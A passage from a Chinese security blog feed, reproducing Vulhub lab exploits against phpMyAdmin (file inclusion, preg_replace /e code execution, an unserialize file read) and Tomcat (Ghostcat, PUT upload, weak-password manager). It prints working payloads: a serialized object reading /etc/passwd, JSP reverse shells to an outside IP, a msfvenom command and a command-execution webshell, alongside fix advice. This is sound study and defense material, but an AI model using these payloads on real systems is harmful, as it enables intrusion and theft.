        <content type="html"><![CDATA[<p>本篇博客主要记录了Vulhub上phpmyadmin漏洞的相关内容！</p><a id="more"></a><h2 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>已登录的攻击者可以利用此漏洞包含任意文件来读取内容，进一步可以包含session来getshell</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>phpmyadmin版本：4.8.0和4.8.1受到影响</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现过程：<a href="https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613%E5%A4%8D%E7%8E%B0">https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613复现</a></p><h2 id="CVE-2016-5734"><a href="#CVE-2016-5734" class="headerlink" title="CVE-2016-5734"></a>CVE-2016-5734</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进<code>preg_replace</code>函数第一个参数中。</p><p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用<code>\0</code>进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此已登录的攻击者便可构造一个任意代码执行漏洞。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>4.0.10.16之前4.0.x版本</li><li>4.4.15.7之前4.4.x版本</li><li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp(python2)地址：<a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p><p>这里下载的是4.4.15.6版本，历史下载版本：<a href="https://www.phpmyadmin.net/files/">https://www.phpmyadmin.net/files/</a></p><p><code>tbl_find_replace.php</code>的24行中，将POST的<code>find</code>和<code>replaceWwith</code>传入到了<code>$table_search</code>的<code>getReplacePreview</code>方法中</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308215820.png" style="zoom:80%;"><p><code>$table_search</code>是<code>PMA_TableSearch</code>对象实例化的结果,而<code>PMA_TableSearch</code>在<code>libraries/TableSearch.class.php</code>中进行了定义，我们定位到<code>libraries/TableSearch.class.php</code>的1430行</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308220159.png" style="zoom:80%;"><p>在<code>getReplacePreview</code>方法中，由于exp中设定了<code>$useRegex</code>的值，所以参数继续传递到<code>_getRegexReplaceRows</code>方法中，定位到1388行</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308220442.png" style="zoom:80%;"><p>在1408~1413行当中，<code>preg_replace(&quot;/&quot; . $find . &quot;/&quot;, $replaceWith, $row[0]);</code>很经典地还原了55856 Bug的场景，exp中通过<code> &quot;find&quot;: &quot;0/e\0&quot;,&quot;replaceWith&quot;: payload,</code>的POST提交，空字节截断并传入e修饰符进而执行我们的payload，也将替换的结果进行了回传，最终的复现如下：</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308221054.png" style="zoom:80%;"><h2 id="WooYun-2016-199433"><a href="#WooYun-2016-199433" class="headerlink" title="WooYun-2016-199433"></a>WooYun-2016-199433</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>phpmyadmin 2.x版本中存在一处反序列化漏洞，该漏洞无需认证登陆，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p><h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>phpmyadmin:2.X(具体版本不清楚，测试用的是2.8.0.4)</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在<code>scripts/setup.php</code>中，存在输入变量<code>configuration</code>,该变量会被<code>unserialize</code>函数进行反序列化操作：</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308225027.png" style="zoom:80%;"><p>当通过该输入点传入一个序列化字符串的时候，会经反序列化出来一个对象。在这个对象反序列化的过程中，会自动触发某些魔法函数。</p><p><code>scripts/setup.php</code>通过<code>require_once</code>函数引入了<code>librarise/common.lib.php</code>文件</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308225340.png" style="zoom:80%;"><p>而<code>librarise/common.lib.php</code>又引入了<code>librarise/Config.class.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308225537.png" style="zoom:80%;"><p>在<code>librarise/Config.class.php</code>中存在魔法函数<code>__wakeup</code>，该魔法函数在对象被反序列化之后立即被触发调用：</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308225925.png" style="zoom:80%;"><p>可以看到，其内在满足条件后，会调用<code>load()</code>函数。继续跟踪<code>load()</code>函数：</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308230130.png" style="zoom:80%;"><p>当检测到<code>file_get_contents</code>被定义，则通过<code>eval</code>函数执行读入的字符串；如果没有<code>file_get_contents</code>函数，则通过<code>file</code>读入文件，同时利用<code>implode</code>函数把文件内容利用<code>\n</code>拼接，再执行<code>eval</code>函数。</p><p>整体思路：php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup.php-&gt;common.lib.php-&gt;Config.<span class="keyword">class</span>.php-&gt;__wakeup()-&gt;load()-&gt;eval();</span><br></pre></td></tr></table></figure><p>接下来就是回顾跟踪需要满足的字段和构造特定的序列化数据：</p><p>在输入点位置<code>setup.php</code>中，需要具备2个传参字段<code>action和configuration</code>，同时创建了<code>$PMA_Config = new PMA_Config();</code></p><p>而在控制点的<code>load</code>函数中，则只需要传入形参<code>source</code>和对应的特定数据即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> PMA_Config();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>我们就可以读文件了</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM截图20200308232307.png" style="zoom:80%;"><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/scripts/setup.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 80</span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p>还有个更简单的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> PMA_Config();</span><br><span class="line">$t -&gt; source = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$str = serialize($t);</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$data = <span class="string">&quot;configuration=&quot;</span>.$str.<span class="string">&quot;&amp;action=test&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST,<span class="literal">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Getshell</strong></p><ul><li><strong>利用方式一</strong></li></ul><p>但是经过分析这个漏洞是不能读取php文件的，因为有了eval()，相当于任意文件包含了，不过另一方面这也是有好处的，如果能写入文件，文件中包含一个一句话就可以直接getshell了。作者给的方式是用error log。</p><p>根据作者的方法，使用默认环境，才发现有点鸡肋，比如，在ubuntu下，一般是不允许用root权限运行，实际测试中，我们是无法读取access.log的，所以getshell就比较困难。在windows下，由于几乎所有的浏览器和python模块都会很“自觉地”将特殊字符编码进行转换”，getshell就更困难了，所以只能用socket去构造shell。</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/3231664811.png" style="zoom:80%;"><p>Access log中就出现了shell了。</p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/301598339.png"></p><p>再用任意文件包含漏洞去包含，就可以拿到shell了。</p><ul><li><strong>利用方式二</strong></li></ul><p>exp修改为如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source = <span class="string">&#x27;ftp://admin:admin@127.0.0.1/phpinfo.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> PMA_Config();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>通过FTP直接远程利用获取shell</p><p>前提是看<code>allow_url_fopen</code>（默认是开启的）</p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIM%E6%88%AA%E5%9B%BE20200309112457.png"></p><p>参考：</p><p><a href="https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/">https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/</a></p><p><a href="https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/">https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/</a></p><p><a href="http://www.polaris-lab.com/index.php/archives/66/">http://www.polaris-lab.com/index.php/archives/66/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> Vulhub </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub之tomcat</title>
      <link href="2020/03/06/Vulhub%E4%B9%8Btomcat/"/>
      <url>2020/03/06/Vulhub%E4%B9%8Btomcat/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了Vulhub上tomcat的漏洞复现，有个还热乎的🤭！</p><a id="more"></a><h2 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>受影响版本</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先把环境搭好</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200306230541.png" style="zoom:80%;"><p>漏洞EXP地址(Python)：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)</a></p><p>tomcat的网站代码默认目录放在<code>webapps/ROOT</code></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200306231251.png" style="zoom:80%;"><p>AJp的默认端口是8009，我们可以用nmap探测以下服务</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200306232256.png" style="zoom:80%;"><p>我们试着读取<code>WEB-INF/web.xml</code>文件</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200306231634.png" style="zoom:80%;"><p>既然是文件包含，能控制文件内容的话就可以rce啊</p><p>rce exp:<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><p>我们先控制文件内容为</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>为啥不能直接用下面的这我也不清楚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.97.210.141/7777 0&gt;&amp;1&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>可以用这个在线网站生成base64那段：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200328114101.png" style="zoom:80%;"><p>然后就可以包含了</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200328114531.png" style="zoom:80%;"><p>当然也可以用msf生成和后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</span><br></pre></td></tr></table></figure><h3 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h3><h4 id="关闭AJp"><a href="#关闭AJp" class="headerlink" title="关闭AJp"></a>关闭AJp</h4><p>编辑 <code>&lt;CATALINA_BASE&gt;/conf/server.xml</code>，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：</CATALINA_BASE></p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200306233614.png" style="zoom:80%;"><p>将此行注释掉（也可删掉该行)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</span></span><br></pre></td></tr></table></figure><p>保存后需重新启动Tomcat，规则方可生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/tomcat/bin</span><br><span class="line">./shutdown.sh</span><br><span class="line">./startup.sh</span><br></pre></td></tr></table></figure><h4 id="不关闭AJp"><a href="#不关闭AJp" class="headerlink" title="不关闭AJp"></a>不关闭AJp</h4><p>最简单的就是更新至最新版本</p><p>如果无法更新我们可以按照下面的操作</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如，将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">secret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如，将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">requiredSecret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>更改之后重启</p><h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p><p>在<code>config/web.xml</code>里，在其中找到default servlet的配置项里增加下面一段代码，即将readonly设置成false，便可以通过PUT/DELETE进行文件操控，触发漏洞</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>受影响版本：Apache Tomcat 7.0.0 - 7.0.79 (windows环境)</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>懒得装个tomcat了，直接用docker吧</p><p>我们直接发个post请求，burp抓包，将POST改成PUT，上传一个shell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307220651.png" style="zoom:80%;"><p>可以看到已经上传成功</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307220929.png" style="zoom:80%;"><p>default servlet只能处理静态文件，而处理jsp文件是jspservlet，但是只有defaultservlet有PUT上传逻辑，解决的办法是通过构造特殊的后缀名来进行绕过，从而上传jsp木马。</p><p><strong>Windows：</strong></p><ul><li><code>shell.jsp%20</code></li><li><code>shell.jsp::$DATA</code></li><li><code>shell.jsp/</code></li><li><code>shell.jsp/.</code></li></ul><p><strong>Linux：</strong></p><ul><li><code>shell.jsp/</code></li><li><code>shell.jsp/.</code></li></ul><p>如果想知道某个站点支持哪些请求方式的话，可以用nmap+script</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 47.97.210.141 -p 8080 --script http-methods -sV</span><br></pre></td></tr></table></figure><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307222351.png" style="zoom:80%;"><h3 id="修复意见-1"><a href="#修复意见-1" class="headerlink" title="修复意见"></a>修复意见</h3><p>将readonly的配置改为true</p><h2 id="Tomcat后台弱口令getshell"><a href="#Tomcat后台弱口令getshell" class="headerlink" title="Tomcat后台弱口令getshell"></a>Tomcat后台弱口令getshell</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>先介绍一下tomcat的后台管理，环境搭好后，访问发现</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307224945.png" style="zoom:80%;"><p>发现三个按钮：<code>Server Status</code>,<code>Manager App</code>,<code>Host Manager</code></p><p>分别表示进入服务器状态，管理服务器上部署的应用，管理主机界面</p><p>在默认情况下，tomcat的配置文件里没有角色，因为在tomcat的conf文件夹下的tomcat-users.xml文件中，用户是被注释掉的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  &lt;role rolename=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;role rolename=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username=&quot;both&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username=&quot;role1&quot; password=&quot;tomcat&quot; roles=&quot;role1&quot;/&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>所以点击三个中任意一个按钮，会跳转到一个拒绝的界面</p><p>在<code>tomcat-users.xml</code>加入下面的role，再创建一个user，重启服务器输入下面创建的用户名和密码就可以进入管理页面了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span>  //对应第二个按钮权限</span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span>  //对应第三个按钮权限</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">password</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>如果设置的账号密码是弱口令的话，就可以登陆后台进一步getshell</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接点击其中一个，发现要输账号密码</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307230634.png" style="zoom:80%;"><p>我们尝试burp抓包，进行爆破，这里的账号密码都是tomcat</p><p>进入<code>Manager App</code>页面，发现可以上传文件(war包)以及目录显示</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307231034.png" style="zoom:80%;"><p>war 包是一种打包格式，Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。</p><p>直接可以在cmd里生成(有java环境)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p>上传上去我们发现多了个shell文件夹</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307232421.png" style="zoom:80%;"><p>可以看到我们已经成功上传一个webshell上去</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIM截图20200307232145.png" style="zoom:80%;"><p>参考：</p><p><a href="http://blog.nsfocus.net/cve-2020-1938/">http://blog.nsfocus.net/cve-2020-1938/</a></p><p><a href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></p><p><a href="https://www.jianshu.com/p/023f3a249a81">https://www.jianshu.com/p/023f3a249a81</a></p><p><a href="https://www.jianshu.com/p/f3e4b5896edb">https://www.jianshu.com/p/f3e4b5896edb</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 复现 </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux相关内容学习</title>
      <link href="2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
